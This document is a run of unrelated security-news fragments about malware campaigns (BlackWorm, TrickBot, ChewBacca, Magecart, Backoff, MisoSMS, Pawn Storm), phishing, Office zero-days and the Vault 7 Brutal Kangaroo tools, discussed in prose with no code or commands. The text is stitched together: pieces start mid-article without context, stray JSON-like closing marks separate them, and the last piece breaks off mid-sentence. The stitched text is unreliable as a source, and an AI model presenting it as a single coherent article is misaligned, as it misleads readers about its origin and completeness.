Known as the Syrian Malware Team, the group has been active going as far back as 2011, according to FireEye. Based on Facebook posts, they are believed to be directly or indirectly involved with the Syrian government. In their attacks, they have been seen using versions of the remote access Trojan BlackWorm.  \"We found at least two distinct versions of the BlackWorm tool, including an original/private version (v0.3.0) and the Dark Edition (v2.1),\" according to FireEye. \"The original BlackWorm builder was co-authored by Naser Al Mutairi from Kuwait, better known by his online moniker ‘njq8′. He is also known to have coded njw0rm, njRAT/LV, and earlier versions of H-worm/Houdini. We found his code being used in a slew of other RATs such as Fallaga and Spygate. BlackWorm v0.3.0 was also co-authored by another actor, Black Mafia.\" It is not uncommon within underground development forums for attackers to collaborate on tools and modify or enhance malware. This is what happened with BlackWorm builder v2.1. According to FireEye, after njq8 and Black Mafia created the original builder, another author, Black Hacker, enhanced its features. The first version of the remote access Trojan had a number of capabilities, including the ability to kill Windows system processes, shutdown and restart the system and collect system information such as the operating system, username, hostname and presence of camera. It can also copy itself to USB drives and create autorun entries. \"BlackWorm v2.1 has the same abilities as the original version and additional functionality, including bypassing UAC, disabling host firewalls and spreading over network shares,\" according to FireEye. \"Unlike its predecessor, it also allows for granular control of the features available within the RAT. These additional controls allow the RAT user to enable and disable features as needed. Binary output can be also be generated in multiple formats, such as .exe, .src and .dll.\" Last month, researchers at Kaspersky Lab noted that cyber-attack activity involving Syria is increasing both in terms of sophistication and organization, with recent malware attacks infecting more than 10,000 users. The victims of the attacks were spread throughout the world, with countries such as Turkey, Saudi Arabia, Lebanon and Palestine being hit hardest. \"We expect attacks by Syrian malware to continue and evolve both in quality and quantity,\" said Ghareeb Saad, senior security researcher of the Global Research & Analysis Team at Kaspersky Lab at the time.  " }

However, Dyre activity ceased in mid-November 2015 and the timing suggested that it was likely related to a raid carried out by Russian authorities. While some of the individuals involved in the development of Dyre might have been arrested, it is possible that one or more of the developers evaded authorities and launched a new project. Researchers at Fidelis Cybersecurity determined that the new TrickBot malware appears to have a strong connection to Dyre. TrickBot, first spotted by the security firm in September, has been observed targeting the customers of Australian banks, including ANZ, Westpac, St. George and NAB. TrickBot’s configuration file also includes the URL for the website of the Canadian Imperial Bank of Commerce (CIBC). TrickBot has functions very similar to Dyre, but it seems to have been rewritten since the coding style is different. For instance, the new Trojan includes more C++ code, compared to Dyre, which mostly used C. Furthermore, TrickBot uses the Microsoft CryptoAPI instead of built-in functions for AES and SHA-256 hashing. Another difference is that unlike Dyre, which ran commands directly, TrickBot interfaces with the Task Scheduler through the COM standard for persistence. According to Fidelis, the custom crypter used by the malware loader (TrickLoader) has also been leveraged by Vawtrak, Pushdo and Cutwail malware. The Cutwail spambot had often been used by the old Dyre gang in its spam operations, and it now appears that cybercriminals are trying to rebuild their Cutwail botnet. The first TrickBot samples analyzed by researchers came with a single module designed for collecting system information from the infected device. A new module for browser injections was spotted in mid-October, but the webinjects appear to be in the testing phase. “It is our assessment with strong confidence that there is a clear link between Dyre and TrickBot but that there is considerable new development that has been invested into TrickBot,” Fidelis researchers explained. “With moderate confidence, we assess that one of more of the original developers of Dyre is involved with TrickBot.” Related Reading: Zeus Banking Trojan Distributed via MSG Attachments Related Reading: Ramnit Banking Trojan Resumes Activity Related Reading: Gozi Banking Trojan Campaigns Target Global Brands " }

It could be a link posted on social media that appears to lead to a subject of interest. It could be the sudden arrival of an emailed invoice. Whatever the ploy, social engineering is the opening salvo in targeted attacks against organizations all over the world. Sometimes, the social engineering begins with an email. Other times it may involve Facebook, and other times it may begin with a phone call. That last scenario was found to be the case in the recent attack on Tesla Motors. A Tesla spokesperson told SecurityWeek that a hacker posed as a Tesla employee, called AT&T customer support and tricked them into forwarding calls to an illegitimate phone number. At that point, the impostor contacted the domain registrar company that hosts teslamotors.com, Network Solutions, and using the forwarded number, added a bogus email address to the Tesla domain admin account. According to the spokesperson, the impostor then reset the password of the domain admin account, routed most of the site's traffic to a spoofed website and temporarily gained access to the Twitter accounts of both the company and its CEO Elon Musk. \"Attackers are constantly evolving their techniques to evade detection and trick even the savviest of users,\" said Rohyt Belani, CEO at PhishMe. \"A prominent example of improved social engineering can be found in “double-barrel” or conversational phishing,\" he said. \"This tactic features two emails: a benign email or lure that builds trust with the recipient and a phishing email that delivers the attack. The constant evolution of attack tactics makes it important to implement a continuous training program that exposes your workforce to the latest attack techniques.\" A recent study by Proofpoint found that sales, finance and procurement were the worst offenders when it came to clicking links in malicious messages. According to Proofpoint, they clicked on the links 50 to 80 percent more frequently than the average departmental click rate. The study used a statistical sample of tens of billions of emails, taken from a larger corpus used by a worldwide customer base. The results reflect data correlations across roughly one trillion data points, with experts analyzing numerous elements per email such as header information, embedded URL and click data. \"The data suggests that information overload and the degree of expected external interaction both play a role in malicious click susceptibility,\" said Kevin Epstein, vice president of advanced security and governance at Proofpoint. \"The top three clickers -- sales, finance, and procurement -- all received the most malicious mail, and are also by their nature functions chartered with responding to large amounts of external communications from never-before-seen sources. Employees in such functions would naturally be prone to be less suspicious of well-constructed phishing email.\" The study also found the peak hours for end-users clicking on malicious links are between 10am and 6pm ET. End-users also were found to click 17 percent more on Tuesdays than the other weekdays. \"Long gone are the days of a Nigerian Prince emailing people with a plethora of grammar and spelling errors,\" said Candis Orr, senior security analyst at Bishop Fox. \"Today, attackers can impersonate a well known company, like a major bank, by acquiring a similar domain to the company, cloning the company’s website, and cloning one of their regular emails where the only difference would be the destination of the included links. Many people cannot tell phishing emails apart from the legitimate ones, so they unfortunately fall for them.\" Most security awareness training done today is very poor, Orr said. \"Companies send out security emails or put up posters and consider that to be training so they can maintain compliance with their required frameworks,\" she said. \"It has become apparent that meeting the minimum requirements necessary for compliance is no longer sufficient for security. Employees need to know what they should and should not do, as well as whom to contact when incidents occur. Companies need better training practices that are more interactive and educational. They should also try to reward employees who report suspicious emails and phone calls, instead of firing or disciplining those who fail.\" A security awareness program should focus on all employees but also be tailored to risk areas, said James Lyne, global head of security research at Sophos. Executives, anyone with interesting data or those who are in the public eye are a natural target and should be given extra focus, he said. Sales and HR people who frequently receive documents or emails from unknown sources are also a particular challenge and should be well versed in the dos and don’ts and how to report it when things go wrong, he added. PhishMe's Belani said that while a salesperson may not analyze the technical aspects of a phishing email, they can be trained to be suspicious of receiving a purchase order they weren't expecting or from an organization they aren't familiar with. If they pass this suspicious email onto the security team, \"suddenly they are an asset instead of a liability,\" he said.  \"It has been long understood that people are one of the major weak links in security defense and that attackers exploit this,\" Lyne said, explaining that many people believe all scams are trivial to spot due to bad spelling, links or other defects. \"While plenty of criminals conform to this profile, many--particularly more targeted attackers--do not,\" he said. Training alone however will not address the issue, said Epstein. \"Training has an impact in reducing clicks, but what the report shows is that it’s not sufficient on a standalone basis -- there’s a clear need for targeted attack protection, and more importantly, automated threat response,\" he said.

Known as ChewBacca - after the character in Star Wars and the name given to one of its functions - the malware drops the function 'P$CHEWBACCA$_$TMYAPPLICATION_$__$$_INSTALL'  as 'spoolsv.exe' into the Startup folder and requests the public IP of the victim via a publicly accessible service.   Tor is dropped as 'tor.exe' to the user's Temp folder and runs with a default listing on 'localhost:9050.'   \"Lately Tor has become more attractive as a service to ensure users' anonymity,\" blogged Kaspersky Lab researcher Marco Preuss. \"Also criminals use it for their activities, but they are only slowly adopting this to host their malicious infrastructure.\"   This was recently seen in a Zeus variant captured in the wild that also included functionality aimed at 64-bit systems. Other malware such as the CrimewareKit Atrax and the botnet built using the Mevade malware have been spotted using Tor as well.   Using Tor offers a level of protection that masks the location of a server. Still, there are drawbacks for attackers. For example, due to the overlay and structure, Tor is slower, Preuss explained. In addition, as seen with Mevade, a massive increase in botnet activity can affect the network and make such activity easy for researchers to spot.   \"Tor is just one of many tricks in a good malware author’s - or gang’s - toolbox,\" noted Richard Henderson, Security Strategist, FortiGuard Threat Research and Response Labs at Fortinet. \"Tracking down command and control [C&C] can be difficult; other methods like…bouncing through C&C proxies, using [domain generation algorithms] and multiple C&C proxies, or using a P2P [peer-to-peer] C&C model…can make it difficult for researchers to track down the head of the beast in order to lop it off.\"   Once running, ChewBacca logs all keystrokes to 'system.log', which is created by the malware in the local Temp folder. The Trojan also enumerates all running processes, reads their process memory and uses two different regular expression patterns to steal information.   Unlike Zeus, ChewBacca is currently not offered in public underground forums, according to Preuss. " }

The campaign, dubbed “Magecart” by cloud-based security solutions provider RiskIQ, dates back to at least March 2016 and is still active today. Some of the attacks aimed at Magento sites were detailed in June by Sucuri, but RiskIQ determined that the attackers have been targeting other platforms as well, including Powerfront CMS and OpenCart. As for the targeted payment processing services, the list includes Braintree and VeriSign. RiskIQ has identified more than 100 online shops from around the world hacked as part of the Magecart campaign, including ones belonging to well-known book publishers, fashion companies, and sporting equipment manufacturers. The cybercrooks even attacked the gift shop of a UK-based cancer research organization. JavaScript code injected by the hackers into these websites captures information entered by users into purchase forms by acting as a man-in-the-middle (MitM) between the victim and the checkout page. In some cases, the malware adds bogus form fields to the page in an effort to trick victims into handing over even more information. The harvested data is exfiltrated over HTTPS to a server controlled by the attacker. By loading the keylogger from an external source instead of injecting it directly into the compromised website, attackers can easily update the malware without the need to re-infect the site. According to RiskIQ, the campaign peaked in June, when the cybercriminals started using an Eastern European bulletproof hosting company to store the domains that serve the malware. In the most recent attacks, experts noticed additional obfuscated script injections. RiskIQ’s report on the Magecart campaign includes the domains used by the attacker to serve the formgrabber code, the attacker’s IP addresses, URLs injected into websites, affected sites, and advice on how merchants and administrators can prevent such incidents.

The Backoff malware was the subject of a recent warning from the U.S. Secret Service and the Department of Homeland Security. It is part of a growing list of malware targeting point-of-sale systems that has sent the retail industry looking for answers. According to the council, organizations should ensure they have the most recent and up-to-date antivirus protection against Backoff and similar malware and run it immediately. In addition, retailers should review all system logs for strange or unexplained activity, in particular any large data files being sent to unknown locations. Finally, the council recommends retailers change all default passwords on systems and applications. In an advisory in July, the Department of Homeland Security noted that in many attacks, hackers are taking advantage of solutions such as Apple Remote Desktop, Splashtop 2 and Microsoft Remote Desktop to hijack computers by brute forcing the solution to gain access. Ultimately, after gaining access to a privileged account, the attackers deployed their malware. \"Our Trustwave researchers have identified and analyzed eight different versions of the Backoff malware thus far which means that the criminals are continuing to update it,\" said Karl Sigler, threat intelligence manager at Trustwave. \"Criminals have primarily targeted third party vendors that sell and support PoS systems for businesses. They infect PoS systems with Backoff mainly by exploiting poor passwords for remote access support software. In many cases, the criminals scanned for those PoS systems that were opened up to the public internet and then logged into those with weak passwords.\" \"Now that the indicators of compromise (IoCs) are public, we expect to see more Backoff victims,\" he added. \"IoCs are specific malware attributes that make them unique and identifiable, such as directory and file names, registry keys, network traffic and file hashes. Anti-virus vendors can use the IoCs to create signatures to flag the malware. Forensic professionals also use IoCs to identify the signs that indicate a Backoff breach.\" In addition to its other recommendations, the council urged retailers to consider implementing PCI-approved point-of-interaction (POI) devices that support the secure reading and exchange (SRED) of data, which encrypts data at the point of capture and would prevent exposure of clear-text data within the ECR or similar POS systems. \"Merchants should also consider implementing a PCI-approved point-to-point encryption (P2PE) solution which includes SRED devices and protects the data until received by the secure decryption facility,\" according to the council's advisory. \"Should systems be found to be infected or unusual activity suspected, organizations should contact their acquiring bank immediately.\" Regarding malware specifically, the council said organizations should review the following security risk mitigating control areas outlined in PCI Data Security Standard (PCI DSS) 3.0:  Proper firewall configuration – Requirement 1  Changing vendor defaults and passwords on devices and systems – Requirement 2  Regularly updating anti-virus protections – Requirement 5  Patching systems – Requirement 6  Limiting access and privileges to systems – Requirements 7,9  Requiring 2-factor authentication and complex passwords – Requirement 8  Inspection of POS devices – Requirement 9  Monitoring systems to allow for quick detection – Requirements 10, 11  Implementing sound security policies for preventing intrusions that may allow malware to be injected – Requirement 12  Managing third party access to devices and systems, and specifically remote access from outside a merchant’s network –– Requirements 8, 12 \"Businesses, whether in PoS or other industries, must not rely on antivirus and start taking a proactive approach in protecting their environment and (customer) data,\" advised Joe Schumacher, senior security consultant at Neohapsis Labs. \"A proactive approach in securing the business technology starts with network isolation or adding secure layers between untrusted and trusted environments.\" \"IT operations,\" he continued, \"should push the business to invest in secure, robust authentication methods that protect the accounts accessing the business network and data. Furthermore, some examples of processes that must be defined include, at minimum, vulnerability/patch management, secure configuration deployments, reviewing firewall rule sets and user provisioning.\" " }

The zero-day vulnerability, tracked as CVE-2018-0802, has been described by Microsoft as a memory corruption issue that can be exploited for remote code execution by getting targeted users to open a specially crafted file via Office or WordPad. Microsoft has credited several researchers from Chinese companies Tencent and Qihoo 360, ACROS Security’s 0Patch Team, and experts from Check Point Software Technologies for finding the flaw. The security hole is related to CVE-2017-11882, a 17-year-old vulnerability in the Equation Editor (EQNEDT32.EXE), which the vendor addressed with the November 2017 Patch Tuesday updates. Based on how the patch was developed, experts believe Microsoft may have lost the application’s source code, which forced it to somehow patch the executable file directly. Microsoft replaced the Equation Editor component in Office 2007, but kept the old one as well for compatibility reasons. The problematic component has now been removed from Office. 0Patch researchers have been analyzing CVE-2017-11882, which has likely led them to discovering a new, related vulnerability. Check Point has published a blog post with the details of CVE-2018-0802 and showed how an exploit works, but they have not mentioned any attacks. This suggests that the Chinese researchers may have been the ones who spotted the vulnerability being exploited in attacks. This would not be the first time experts at Qihoo 360 witnessed the exploitation of an Office zero-day. Back in October, after Microsoft released a patch, they reported seeing CVE-2017-11826 being leveraged to deliver malware. If CVE-2018-0802 is related to CVE-2017-11882, there is a long list of threat actors who may be exploiting it. CVE-2017-11882 has been exploited by Iranian cyberspies, the Cobalt hacking group, someone who uses TelegramRAT, and likely others. Microsoft’s Patch Tuesday updates also address a spoofing vulnerability in Office for Mac that has already been publicly disclosed. Sixteen of the flaws resolved this month have been rated critical, a majority affecting the scripting engine used by the Edge and Internet Explorer web browsers. Microsoft has also rated critical a Word vulnerability (CVE-2018-0797) that can be exploited for remote code execution using specially crafted RTF files. Adobe’s Patch Tuesday updates for this month patch only one information disclosure vulnerability in Flash Player. " }

IRC botnets rely on IRC servers for command and control (C&C) communications. Their operators control malware-infected machines through IRC channels. One of the most prevalent IRC-based botnets is powered by Dorkbot (also known as Nrgbot), a worm capable of stealing passwords, enlisting infected devices in distributed denial-of-service (DDoS) attacks, downloading other pieces of malware, and preventing users from downloading security updates. The threat is distributed via USB drives, social media websites, and instant messaging services. Over the last three months, Zscaler has been monitoring one of the domains used to serve the Dorkbot installer. Once it infects a device, the malware creates a registry entry for persistence and starts injecting threads into processes such as svchost.exe, mspaint.exe, and calc.exe. The thread injected into mspaint.exe is designed to resolve a list of domains, while the thread in the calc.exe process is used to download additional malware from a total of 20 URLs encrypted using a custom encryption method. Researchers also noted that Dorkbot has a user-mode rootkit component. In addition to Dorkbot, Zscaler has also analyzed three other IRC bot families: RageBot, Phorpiex, and IRCBot.HI. According to the security firm, these worms are designed to check for the presence of a virtual machine, sandbox or honeypot in an effort to prevent researchers from analyzing them. Each of these threats has a different propagation mechanism. RageBot spreads by copying itself into RAR archive files, and folders associated with instant messaging and peer-to-peer (P2P) applications. Phorpiex spreads through removable drives, while the IRCBot.HI sample analyzed by Zscalers was designed to leverage Skype in order to spread. Once they infect a machine, RageBot, Phorpiex, and IRCBot.HI start communicating with their IRC-based C&C servers from which they receive instructions on what activities to carry out. “In this era of sophisticated Botnets with multiple C&C communication channels, custom protocols, and encrypted communication; we continue to see a steady number of new IRC based Botnet payloads being pushed out in the wild on a regular basis.” Zscaler researchers noted in a blog post. “As we saw in our analysis, IRC based Botnet families continue to evolve in terms of sophisticated features incorporated in the bots.” " }

The new solution, Enterprise Threat Protector, aims to address the risks associated with DNS communications. According to Akamai, the product leverages threat data from the company’s Cloud Security Intelligence system to determine the “intent” of DNS requests and detect potentially targeted attacks. Enterprise Threat Protector analyzes an organization’s recursive DNS requests and blocks connections to domains associated with suspicious or malicious activity, including malware drop sites, ransomware, and phishing pages. Akamai says the product can also disrupt communications between infected hosts and command and control (C&C) servers. It’s not uncommon for malware to rely on DNS for data exfiltration and Enterprise Threat Protector should prevent attempts to send data outside the protected organization. Security teams can also utilize the new product to improve compliance and enforce acceptable use policies. Since Enterprise Threat Protector is a cloud-based solution, it’s highly scalable and it can be configured and deployed within minutes without the need for new hardware or complex changes to the network. \"Our customers' security teams are facing adversaries that consistently shift attack tactics and vectors, specifically seek out gaps in defenses and can be incredibly persistent in attempts to find weaknesses in a company's security posture. Enterprises need quick-to-deploy and easy-to-manage cloud-based solutions that can address these unique issues as part of their overall security strategy,\" said John Summers, vice president and general manager of Enterprise Products at Akamai. \"With Enterprise Threat Protector, we're providing our customers with a powerful, intelligent solution that can help detect and stop targeted attacks in their tracks.\" Related Reading: Cisco Launches \"Umbrella\" Secure Internet Gateway Related Reading: ThreatConnect Launches New Threat Intelligence Products Related Reading: Qualys Launches Container Security Product " }

Additional details about the attack emerged in recent days as researchers from Trustwave's SpiderLabs continued to dig into reports of malware disguised as modules for Microsoft's Internet Information Services (IIS) software. According to Trustwave, the malware - which they have dubbed ISN – is designed to steal data and targets information in POST requests.   The vulnerability the attackers used was CVE-2013-0629, which Adobe actually patched back in January.    \"It is important to also highlight the criticality of having an expedited patching life-cycle,\" Trustwave's Ryan Barnett blogged, noting that in one incident, the targeted organizations was compromised less than two months after Adobe disclosed the vulnerability.  \"In this particular incident, the victim organization was aware of the vulnerability report by Adobe, however they were on a quarterly patching process and had not yet installed the patch,\" he continued. \"Deploying a Web Application Firewall (WAF) is an excellent method for minimizing the Time-to-Patch expsures for web application vulnerabilities. In this case, the victim organization did not have a WAF already deployed so actual software patching was their only option.\"   The malware's installer has four embedded DLLs that are dropped depending on the victim, the researcher continued. Specifically, there are IIS modules for IIS 32-bit; IIS 64-bit; IIS 7+ 32-bit and IIS7+ 64-bit. The malware also has a VBS file embedded as a PE resource that is used to install or remove the DLLs as an IIS module.   \"Encryption is circumvented as the malware extracts this data from IIS itself,\" blogged Trustwave's Josh Grunzweig last week. \"This was seen targeting credit card data on e-commerce sites, however, it could also be used to steal logins, or any other sensitive information sent to a compromised IIS instance.\" " }

Just like other major companies, Netflix constantly analyzes online discussions and posts that might present an interest to its security team. For example, hackers could be planning on launching a distributed denial-of-service (DDoS) attack against its servers. If they are discussing their plans on a social media platform or on a forum, the company could learn of the attack and prevent it from causing any damage. Two of the security-related applications used by Netflix's security team are Scumblr and Sketchy, which the company released on Monday as open source. Scumblr, a Web app developed in Ruby on Rails, enables users to search the Internet for content of interest. Its built-in plugins are designed for searches on seven popular websites, including Google, Facebook and Twitter. However, new plugins can easily be created for manual or automatic searches on other sites, the company said. \"Scumblr leverages a gem called Workflowable (which we are also open sourcing) that allows setting up flexible workflows that can be associated with search results,\" Andy Hoernecke and Scott Behrens of the Netflix Cloud Security Team explained in a blog post. \"These workflows can be customized so that different types of results go through different workflow processes depending on how you want to action them. Workflowable also has a plug-in architecture that allows triggering custom automated actions at each step of the process.\" Scumblr is designed to work together with Sketchy, which takes screenshots and collects text from websites. This can be prove useful because some of the results found by Scumblr could be on malicious sites. By using the two applications together, security analysts can view the content they're looking for without putting themselves at risk. \"Although a variety of tools and frameworks exist for taking screenshots, we discovered a number of edge cases that made taking reliable screenshots difficult - capturing screenshots from AJAX-heavy sites, cut-off images with virtual X drivers, and SSL and compression issues in the PhantomJS driver for Selenium, to name a few,\" Hoernecke and Behrens said. Sketchy, which can be used through an API, addresses all these issues. The tool is capable of saving HTML, capturing screenshots and scraping text, all of which can be stored locally or in the cloud (AWS S3 bucket). In order to allow users to scale Sketchy for capturing data from large websites, Netflix developers have relied on the Celery task management system. As for AJAX-heavy websites, PhantomJS with \"lazy-rendering\" is leveraged to ensure that the content is captured correctly. Scumblr, Sketchy and Workflowable are available on Netflix's page on GitHub. " }

Google Apps Script is a JavaScript-based scripting language that allows developers to build web applications and automate tasks. Experts noticed that the service could have been leveraged to deliver malware by using simple triggers, such as onOpen or onEdit. In an attack scenario described by Proofpoint, attackers uploaded a piece of malware to Google Drive and created a public link to it. They then used Google Docs to send the link to the targeted users. Once victims attempted to edit the Google Docs file, the Apps Script triggers would cause the malware to be automatically downloaded to their devices. Researchers said attackers could have used social engineering to convince the target to execute the malware. Google has implemented new restrictions for simple triggers in an effort to block malware and phishing attacks triggered by opening a document. While there is no evidence that this method has been exploited in the wild, malicious actors abusing Google Apps Script is not unheard of. A cybercrime group using the infamous Carbanak malware at one point leveraged the service for command and control (C&C) communications. “SaaS platforms remain a ‘Wild West’ for threat actors and defenders alike. New tools like Google Apps Script are rapidly adding functionality while threat actors look for novel ways of abusing these platforms. At the same time, few tools exist that can detect threats generated by or distributed via legitimate software-as-a-service (SaaS) platforms,” explained Maor Bin, security research lead of Threat Systems Products at Proofpoint.  “This creates considerable opportunities for threat actors who can leverage newfound vulnerabilities or use ‘good for bad’: making use of legitimate features for malicious purposes,” he added. A few months ago, Google announced the introduction of new warnings for potentially risky web apps and Apps Scripts. " }

The latest version of the company’s flagship offering, Invincea Advanced Endpoint Protection 5, now combines containerization technology with advanced endpoint visibility, analysis, and control to provide compromise detection and elimination, the company said.   The common attack vectors leading to breaches is employees clicking on malicious links, visiting compromised websites or opening weaponized documents—all threats that Invincea aims to defeat via its endpoint security solution. In a recent blog post debating the effectiveness of security awareness training, Anup Ghosh, founder and CEO of Invincea, explained that while educating employees on the risks of using email and the Web is important, relying on users to make the correct decision on every email link, attachment or web page they choose to click on is nearly impossible.   “If there is an attachment, someone will open it – no matter how much you have trained users,” Ghosh said. “It is not only human instinct you are trying to untrain, it is the way we do business. You can’t train an HR person not to open a resume sent in PDF – that’s his job. You can’t train an executive not to open a business proposal—that’s her job. In both cases, these are common spear-phishing tactics.”   The addition of new sensor technology, which works alonside its cloud-based cyber genome analysis technology, Cynomix, enables security teams to identify compromised devices.  Invincea Advanced Endpoint Protection now includes granular escalating controls that emable security teams to isolate suspect processes on endpoints, quarantine compromised devices, and eradicate threats across the enterprise.  Invincea Management, which runs cloud-hosted or on-premise, manages endpoints and allows security teams to selectively publish threats to trusted communities in standard STIX format.  Comprised of Invincea Endpoint (formerly Invincea FreeSpace), Invincea Management (formerly Invincea Management Server) and Cynomix, Invincea Advanced Endpoint Protection 5 includes capabilities:  •\tSecure Virtual Container - Protects the most targeted and vulnerable applications (Web browsers, Java, Flash, PDF readers, Office applications) by running them in a secure virtual container. Attacks are isolated from the host operating system, preventing the adversary from accessing sensitive data or conducting lateral movement in the network. A control interface kills any suspicious processes in the container, while detailed forensic data is captured for analysis.  •\tEndpoint Sensor to Identify Existing Breaches - The endpoint agent now includes an integrated sensor that identifies suspicious processes already existing on the machine. The sensor sends only anomalous events to Invincea Management for further analysis using cloud-based analytics.  •\tPluggable Framework for Threat Analysis Services - The solution now includes a framework for integrating third-party threat analysis services. Pre-built integrations are included for Cynomix, VirusTotal, Metascan and ReversingLabs; additional services can be added via an open API.  •\tCynomix - A DARPA-funded technology built by Invincea Labs, Cynomix uses machine learning techniques to analyze unknown executables and identify maliciousness through their genetic markers. Using a mapping of the cyber genome of millions of pieces of malware, Cynomix identifies new malware strains well before other solutions. In June 2013, Invincea announced an OEM partnership with Dell under which the PC maker would ship systems with Invincea technology installed straight from the factory on all commercial systems including its Precision, Latitude and Optiplex machines.

There are several OS X malware families capable of recording sound and video, including Crisis, Eleanor and Mokes (DropboxCache). However, if such threats attempt to record video via the built-in webcam, the victim is alerted by the camera’s LED. Researchers demonstrated in 2013 that the interlock between the camera and the indicator LED can be bypassed without admin privileges or physical access on some older iMacs and MacBooks (e.g. from 2008), but similar attacks have not been demonstrated in more recent years and they are believed to be very difficult to carry out. Patrick Wardle, director of research at Synack, pointed out that while OS X malware can have trouble recording video through the webcam without alerting the victim, threats could piggyback on legitimate applications to silently spy on users. When an application such as FaceTime or Skype enables the built-in webcam, users expect the LED indicator to be on. A piece of malware that can monitor the infected system for legitimate user-initiated video sessions can surreptitiously piggyback on this session and secretly record the victim. Wardle has developed proof-of-concept (PoC) malware that can detect the installed camera and monitor its status in an effort to determine when a video session is initiated and when it ends. If it detects a session, the malware begins recording audio and video data, and it stops when the process that started the session exits. It’s worth noting that the malware does not actually need to inject code into the targeted process. Instead, it uses the existing session and the enabled LED indicator to record data from the webcam without being detected. There are several advantages to this type of malware, including that it does not require root privileges (i.e. the attack can be performed by any non-sandboxed code or app), and it leverages legitimate features of the operating system, which makes it more difficult to prevent. Wardle told SecurityWeek that he is not aware of any OS X malware family that has been leveraging this technique in the wild, but he believes such threats would not be difficult to create. The researcher said he had an informal chat with Apple regarding the attack method, but it’s unlikely that the company will attempt to address the issue anytime soon. “I’ll be the first to caveat it’s not a vulnerability, nor exploit,” Wardle said via email. “Sure, I’d like to know whenever somebody uses the webcam or mic (especially if a session is already active) - would be nice if the OS told you that. But from a usability point of view, it makes sense that the webcam is a shared resource (like you can FaceTime and take images with PhotoBooth at the same time). I doubt Apple will do anything about this - and honestly I’m not sure they should.” Concerned users can install a new tool developed by Wardle specifically for these types of attacks. The application, named OverSight, runs in the background and monitors the computer’s microphone and webcam via user-mode APIs, alerting the user when these components become active. In the case of the microphone, OverSight only notifies the user that it has become active, but webcam notifications include the name of the process that wants to access the camera and allows users to permit or block the action.  This is not the first OS X security tool developed by Wardle. Earlier this year, he released RansomWhere?, an application designed to generically detect ransomware attacks by continually monitoring the system for the creation of encrypted files by suspicious processes.

Dubbed “Brutal Kangaroo,” it has been described by its developer as a tool suite designed for targeting closed networks. The infected systems will form a covert network, and the attacker will be able to obtain information and execute arbitrary files. One component of Brutal Kangaroo is called “Shattered Assurance” and it’s designed to automatically spread the tool to USB drives connected to a device within the targeted organization that was infected remotely via the Internet. Shattered Assurance relies on a tool named “Drifting Deadline” to infect thumb drives. Once the victim connects the infected drive to an air-gapped network and Brutal Kangaroo is deployed, a component named “Broken Promise” is used to evaluate the harvested data. The last component, dubbed “Shadow,” acts as the primary persistence mechanism and command and control (C&C) server on the closed network. The documents published by WikiLeaks show that Drifting Deadline and Shattered Assurance replaced two previous tools named “EZCheese” and “Emotional Simian.”  Brutal Kangaroo infects USB drives by exploiting Windows vulnerabilities that allow an attacker to execute arbitrary DLL files using specially crafted shortcut (LNK) files. At least some of the exploits do not require users to actually run the malicious files. Earlier versions of EZCheese leveraged a Windows vulnerability (CVE-2015-0096) discovered and patched in 2015. The flaw is a newer variant of CVE-2010-2568, which the notorious Stuxnet worm used in attacks aimed at Iran’s nuclear program. One exploit used in later versions, dubbed “Lachesis” and designed for Windows 7, relies on autorun.inf to execute the malicious file as soon as the thumb drive is plugged in. Another exploit, named “RiverJack” and designed for Windows 7, 8 and 8.1, leverages library-ms functionality. Microsoft said the vulnerabilities used by these exploits have already been patched in supported versions of Windows, but it’s unclear when. The company this month patched a LNK remote code execution flaw (CVE-2017-8464) that has been actively exploited, but no information has been provided on these attacks. While the exploits may have been successful in some cases, the Brutal Kangaroo documents show that security products from Symantec, Avira, Avast, Bitdefender and Kaspersky did block at least some functionality and attack vectors. WikiLeaks has been publishing CIA files, which are part of a leak dubbed “Vault 7,” nearly every week since March 23. The tools exposed by the whistleblower organization include ones designed for replacing legitimate files with malware, hacking Samsung smart TVs and routers, MitM tools, a framework used to make malware attribution and analysis more difficult, and a platform for creating custom malware installers. Security firms have found links between the tools exposed by Wikileaks and the malware used by a cyber espionage group tracked as “Longhorn” and “The Lamberts.” Related Reading: Hackers Can Use Scanners to Control Air-Gapped Malware Related Reading: Router LEDs Allow Data Theft From Air-Gapped Computers " }

Researchers at FireEye lifted the curtain off the threat today, describing MisoSMS as \"one of the largest advanced mobile botnets to date\" and warning that it is being used in more than 60 spyware campaigns. FireEye tracked the infections to Android devices in Korea and noted that the attackers are logging into command-and-controls in from Korea and mainland China, among other locations, to periodically read the stolen SMS messages. FireEye's research team discovered a total of 64 mobile botnet campaigns in the MisoSMS malware family and a command-and-control that comprises more than 450 unique malicious e-mail accounts. FireEye security content researcher Vinay Pidathala said MisoSMS infects Android systems by deploying a malicious Android app called \"Google Vx\" that masquerades as an Android settings app used for administrative tasks.  The app uses a bit of trickery to install and hide itself from the user.  Once it's installed, the app secretly steals the user’s personal SMS messages and emails them to a webmail command-and-control. Pidathala explains the SMS exfiltration method: This application exfiltrates the SMS messages in a unique way. Some SMS-stealing malware sends the contents of users SMS messages by forwarding the messages over SMS to phone numbers under the attacker’s control. Others send the stolen SMS messages to a CnC server over TCP connections. This malicious app, by contrast, sends the stolen SMS messages to the attacker’s email address over an SMTP connection.   Pidathala said all of the reported malicious e-mail accounts have been deactivated as part of a mitigation strategy with law enforcement and security response officials in Korea and China.

According to Trend Micro, new intelligence on the group shows they have introduced new infrastructure and are \"zeroing in\" on targets such as North Atlantic Treaty Organization (NATO) members. The group has been active since 2007, and is believed to be linked to the Russian government. It has targeted military, defense industry as well as government and media organizations around the globe. \"The first quarter of 2015 has seen a great deal of activity from the group,\" blogged Feike Hacquebord, senior threat researcher at Trend Micro. \"Most notably this involved setting up dozens of exploit URLs and a dozen new command-and-control (C&C) servers targeting NATO members and governments in Europe, Asia and the Middle East.\" According to Hacquebord, the group has traditionally used three distinct attack strategies. One was using spear-phishing emails with malicious Microsoft Office documents laced with the SEDNIT/Sofacy malware. Another was to inject exploits into legitimate Polish government sites that lead victims to the aforementioned malware. Their third strategy has been to send out phishing emails redirecting users to fake Microsoft Outlook Web Access (OWA) login pages. \"In a slightly different modus operandi from the usual, we observed Pawn Storm attackers sending out specially-crafted emails designed to trick users into clicking on a malicious link,\" he blogged. \"In one case, the subject of the spam e-mail is the Southern Gas Corridor that the European Union initiated to become less dependent on Russian Gas. Other e-mails have similar geopolitical subjects, for example the Russian-Ukrainian conflict and the Open Skies Consultative Commission of the OSCE.\" The emails typically contain a link to what appears to be a legitimate news site. When the user clicks on the link, he or she will load a fingerprinting script that feeds back details like their time zone, browser and installed plugins to the attackers. \"When certain criteria are met the fake news site may respond with a message that an HTML5 plugin has to be installed to view the contents of the site,\" he blogged. \"The add-on in question turns 